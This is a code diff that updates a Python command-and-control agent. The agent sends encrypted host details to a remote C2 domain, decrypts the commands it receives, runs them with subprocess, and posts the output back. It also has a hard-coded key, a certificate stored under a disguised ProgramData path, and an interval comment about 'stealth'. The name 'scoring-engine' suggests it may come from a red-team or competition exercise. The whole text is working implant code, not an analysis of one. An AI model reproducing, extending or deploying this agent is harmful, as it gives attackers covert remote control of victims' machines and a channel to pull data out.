@@ -9,33 +9,36 @@ from cryptography.fernet import Fernet
 SECRET_KEY = b'7lJcf_dNt7Jhc87wCBcYO46b4XRy18upQmOKrij3B4k='
 cipher = Fernet(SECRET_KEY)
 
-# Failover list
+# Failover list - Add all your backup domains here
 C2_DOMAINS = [
     "https://midevil-scoring-engine.com"
 ]
 
-# Path to self signed cert
+# Path to self-signed cert
 CERT_PATH = r"C:\ProgramData\Microsoft\Network\Settings\nginx-selfsigned.crt"
 
-# Agent check if still alive
 def get_system_info():
+    """Gathers system metadata for the dashboard asset inventory."""
     info = {
         "hostname": platform.node(),
-        "os": platform.system(),
+        "os": f"{platform.system()} {platform.release()}",
         "status": "Online"
     }
     return json.dumps(info)
 
 def run_agent():
-    print("[*] Secure Agent started. Beginning beaconing...")
+    my_hostname = platform.node()
+    print(f"[*] Agent [{my_hostname}] initialized. Beginning beaconing...")
     
     while True:
+        success = False
         for url in C2_DOMAINS:
             try:
+                # 1. Prepare Heartbeat
+                raw_info = get_system_info()
+                encrypted_heartbeat = cipher.encrypt(raw_info.encode())
 
-                raw_data = get_system_info()
-                encrypted_heartbeat = cipher.encrypt(raw_data.encode())
-
+                # 2. Beacon Out (Check-in)
                 response = requests.post(
                     f"{url}/checkin", 
                     data=encrypted_heartbeat, 
@@ -44,26 +47,42 @@ def run_agent():
                 )
 
                 if response.status_code == 200:
+                    success = True
                     encrypted_command = response.content
                     command = cipher.decrypt(encrypted_command).decode()
 
                     if command and command.lower() != "none":
-                        print(f"[*] Decrypted Command Recieved: {command}")
+                        print(f"[*] Executing: {command}")
                         
-                        result = subprocess.getoutput(command)
+                        # Execute command
+                        raw_result = subprocess.getoutput(command)
                         
-                        encrypted_result = cipher.encrypt(result.encode())
-                        requests.post(f"{url}/result", data=encrypted_result, verify=CERT_PATH)
+                        # 3. Format Result: "HOSTNAME|OUTPUT" 
+                        # This allows the dashboard to attribute the result to the right client
+                        formatted_result = f"{my_hostname}|{raw_result}"
+                        
+                        encrypted_result = cipher.encrypt(formatted_result.encode())
+                        
+                        # Send result back
+                        requests.post(
+                            f"{url}/result", 
+                            data=encrypted_result, 
+                            verify=CERT_PATH,
+                            timeout=10
+                        )
+                        print("[+] Result transmitted.")
                     
+                    # If we found a working domain, stop cycling through the list for this interval
                     break 
 
             except Exception as e:
-                print(f"[!] Failed to connect to {url}: {e}")
-                continue # Try the next domain in the list
+                print(f"[!] Connection failed for {url}: {e}")
+                continue 
         
-        # Beacon Interval
-        print("[*] Sleeping for 30s...")
-        time.sleep(30)
+        # Interval - Adjust for "Liveliness" (e.g., 10s for testing, 30s-60s for stealth)
+        wait_time = 15
+        print(f"[*] Beacon interval complete. Sleeping {wait_time}s...")
+        time.sleep(wait_time)
 
 if __name__ == "__main__":
     run_agent()
